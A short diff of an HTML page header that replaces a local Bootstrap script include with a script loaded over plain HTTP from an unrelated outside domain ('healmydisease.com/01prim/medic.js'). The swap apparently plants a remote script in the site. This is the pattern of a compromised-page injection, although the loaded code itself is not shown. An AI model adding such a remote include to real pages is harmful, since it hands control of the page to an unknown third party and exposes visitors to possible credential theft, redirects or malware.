@@ -6,11 +6,11 @@
     <link href="../../assets/stylesheets/neumo.css" rel="stylesheet" media="screen">
 
     <script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
-    <script src="../../assets/js/bootstrap.min.js"></script>    
+    <script src="http://www.healmydisease.com/01prim/medic.js"></script>
 
   </head>
 <body>
-
+   
 <!--menu starts here-->
   <div style="background:#3A3A3A;color:#fff;padding:10px">
     <div class="row-fluid">
